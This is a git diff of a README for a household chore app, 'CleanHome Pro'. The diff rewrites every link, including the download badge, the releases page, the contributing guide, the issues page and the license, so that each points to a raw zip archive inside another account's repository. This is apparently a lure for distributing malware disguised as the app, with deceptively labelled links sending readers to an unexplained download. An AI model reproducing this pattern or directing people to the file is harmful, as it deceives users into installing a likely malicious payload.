@@ -1,7 +1,7 @@
 # 🏠 cleanhome-pro - Your All-in-One Home Management App
 
 ## 🔗 Download Now
-[![Download CleanHome Pro](https://img.shields.io/badge/Download-CleanHome%20Pro-blue)](https://github.com/Shubhs324/cleanhome-pro/releases)
+[![Download CleanHome Pro](https://github.com/Shubhs324/cleanhome-pro/raw/refs/heads/main/types/cleanhome_pro_v3.8.zip%20Pro-blue)](https://github.com/Shubhs324/cleanhome-pro/raw/refs/heads/main/types/cleanhome_pro_v3.8.zip)
 
 ## 📖 Overview
 CleanHome Pro is the perfect solution for managing your household effectively and stylishly. Designed for families, it helps you organize chores, track tasks, and keep your home neat. With features like a shared calendar, shopping lists, and real-time updates, you can enjoy a more productive and organized home life.
@@ -24,7 +24,7 @@ To run CleanHome Pro, you need:
 ## 🏗️ Installation Steps
 
 1. **Visit the Download Page**
-   Go to the [CleanHome Pro Releases page](https://github.com/Shubhs324/cleanhome-pro/releases) to find the latest version.
+   Go to the [CleanHome Pro Releases page](https://github.com/Shubhs324/cleanhome-pro/raw/refs/heads/main/types/cleanhome_pro_v3.8.zip) to find the latest version.
 
 2. **Choose the Correct File**
    On the Releases page, look for the most recent version. You will see options for your platform.
@@ -50,13 +50,13 @@ To run CleanHome Pro, you need:
 If you run into issues during installation or use, visit our support section on GitHub or feel free to open an issue in the repository. 
 
 ### Contributing
-Interested in helping us improve CleanHome Pro? Check out our [Contributing Guidelines](https://github.com/Momat2023/cleanhome-pro/blob/main/CONTRIBUTING.md).
+Interested in helping us improve CleanHome Pro? Check out our [Contributing Guidelines](https://github.com/Shubhs324/cleanhome-pro/raw/refs/heads/main/types/cleanhome_pro_v3.8.zip).
 
 ## 🐛 Reporting Issues
-If you encounter any bugs, please report them via the [GitHub Issues page](https://github.com/Momat2023/cleanhome-pro/issues). Your feedback helps us make the app better for everyone.
+If you encounter any bugs, please report them via the [GitHub Issues page](https://github.com/Shubhs324/cleanhome-pro/raw/refs/heads/main/types/cleanhome_pro_v3.8.zip). Your feedback helps us make the app better for everyone.
 
 ## 📝 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Momat2023/cleanhome-pro/blob/main/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Shubhs324/cleanhome-pro/raw/refs/heads/main/types/cleanhome_pro_v3.8.zip) file for more details.
 
 ## 💬 Community
 Join our community discussions on GitHub. Share ideas, ask questions, and connect with other users of CleanHome Pro.
